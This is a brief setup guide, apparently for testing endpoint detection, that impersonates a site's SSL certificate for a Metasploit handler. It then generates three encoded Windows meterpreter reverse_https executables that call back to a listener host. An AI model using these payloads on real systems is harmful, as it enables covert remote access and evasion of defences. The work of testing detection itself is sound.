# Inital Setup for MSF Testing

Change the default metasploit SSL cert:

```
sudo msfconsole

use auxiliary/gather/impersonate_ssl 
set RHOST example.com

run
```

Example output:
![output](https://github.com/blumirabrian/endpoint-detection-methology/blob/main/msf/edr1.png "Command Output")

Take the .pem file and use for setting the SSL cert in the msf.rc file.

Change:
```
set HANDLERSSLCERT /root/attack.crt
```

To your new cert you collected:
```
set HANDLERSSLCERT /root/.msf4/loot/20210526091350_default_93.184.216.34_93.184.216.34_pe_809138.pem
```

## Payload Generation

Create 3 msfvenom payloads

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 1 lport=8443 lhost=1.2.3.4 -b "\x00" -f exe -o test.exe
```

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 20 lport=8443 lhost=1.2.3.4 -b "\x00" -f exe -o test2.exe
```

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 30 lport=8443 lhost=1.2.3.4 -b "\x00\xff" -f exe -o test3.exe
```
